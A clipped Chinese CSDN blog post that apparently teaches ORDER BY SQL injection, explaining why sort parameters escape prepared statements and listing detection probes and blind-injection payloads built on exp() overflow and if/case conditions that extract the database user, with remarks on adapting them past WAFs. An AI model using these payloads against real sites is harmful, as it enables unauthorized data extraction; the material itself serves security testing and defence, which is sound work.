---
title: "初识排序注入-CSDN博客"
source: "https://blog.csdn.net/kailiaq_1/article/details/130646273"
author:
published:
created: 2025-04-03
description: "文章浏览阅读1k次。但是采用预编译执行SQL语句传入的参数不能作为SQL语句的一部分，那么Order By后的字段名、或者是desc\asc也不能预编译处理，那么也就是说Order By场景的排序规则还是只能使用拼接，这时候如果在开发阶段没有处理好，那么就很可能导致SQL注入问题了。拿着这个poc去尝试这些天碰到的排序注入，发现都可以嗷，对比盲注来说，漏洞证明的过程还是会节省一些时间。总之都是利用盲注的方式来获取数据，从基础的poc fuzz到poc2、poc3甚至poc4，取决于waf的强弱、个人习惯。_排序注入"
tags:
  - "clippings"
---
**一、前言**

在 [SQL语言](https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E8%A8%80&spm=1001.2101.3001.7020) 中，Order By语句主要用于对结果集进行排序。既然跟数据库交互有关，自然而然就会想到SQL注入的防护问题，第一时间想到的方案就是预编译了。但是采用预编译执行SQL语句传入的参数不能作为SQL语句的一部分，那么Order By后的字段名、或者是desc\\asc也不能预编译处理，那么也就是说Order By场景的排序规则还是只能使用拼接，这时候如果在开发阶段没有处理好，那么就很可能导致SQL注入问题了。排序也一直是注入的重灾区。

**二、挖掘思路**

存在关键参数值 desc

如下图

![](https://i-blog.csdnimg.cn/blog_migrate/67c7af7556152576d8904c63d104e931.png)

检测方法：

,1 &&,0

,1/1 &&,1/0

,exp(71) &&,exp(710)

异或

**三、排序注入挖掘**

这里使用的是exp() //数值大于709就会溢出

Poc：AdminID+desc,exp(7)

![](https://i-blog.csdnimg.cn/blog_migrate/b269c33ad4681ded52ec39fa6b012c69.png)

Poc:AdminID+desc,exp(710)

![](https://i-blog.csdnimg.cn/blog_migrate/7ee4b78f93503d2c9abc2300537c2f4a.png)

此时不难发现，溢出时，响应时间比较长

所以在盲注中，建议条件为真时溢出

Poc 开始变形

Poc:AdminID+desc,if(user()+like+'r%',exp(710),exp(7))

![](https://i-blog.csdnimg.cn/blog_migrate/46aead4b7a521a7684f90d0828ab5eff.png)

Poc:AdminID+desc,if(user()+like+'c%',exp(710),exp(7))

![](https://i-blog.csdnimg.cn/blog_migrate/b0917619487137d827a3e575a21c957a.png)

**四、排序注入—补充**

1、因果的因

最近碰到挺多排序注入（关键字：orderby，desc，asc等）构造的poc大多为

1,if(1,exp(789),1)

1,case+when+hex(mid(user(),1,1))=63+then+exp(789)+else+exp(0)+end

……

（poc的书写取决于站点是否对相关 函数 、单引号有所拦截）

总之都是利用盲注的方式来获取数据，从基础的poc fuzz到poc2、poc3甚至poc4，取决于waf的强弱、个人习惯。

2、因果的果

图一是使用报错注入获取用户名

![](https://i-blog.csdnimg.cn/blog_migrate/f166fd238e8192a8ea72ca278dcb402c.png)

图二是验证此poc是否可用（图一图二是同一系统不同的注入点）

![](https://i-blog.csdnimg.cn/blog_migrate/273ee111d789c85aa9f0482fd569b370.png)

图三是在有waf的情况下使用（有没有觉得这个poc有点眼熟呀）

![](https://i-blog.csdnimg.cn/blog_migrate/cda4043c8ab2ffbd50f443d4b946101d.png)

拿着这个poc去尝试这些天碰到的排序注入，发现都可以嗷，对比盲注来说，漏洞证明的过程还是会节省一些时间。暂不知是否通用，还需要大量的案例来验证。

由于时间关系，只验证了排序注入，也未在本地尝试。

![](https://i-blog.csdnimg.cn/blog_migrate/5766aeb8fcc4016dde453a7c6d237441.jpeg)

更多网络安全教程资源和软件在这 微信名片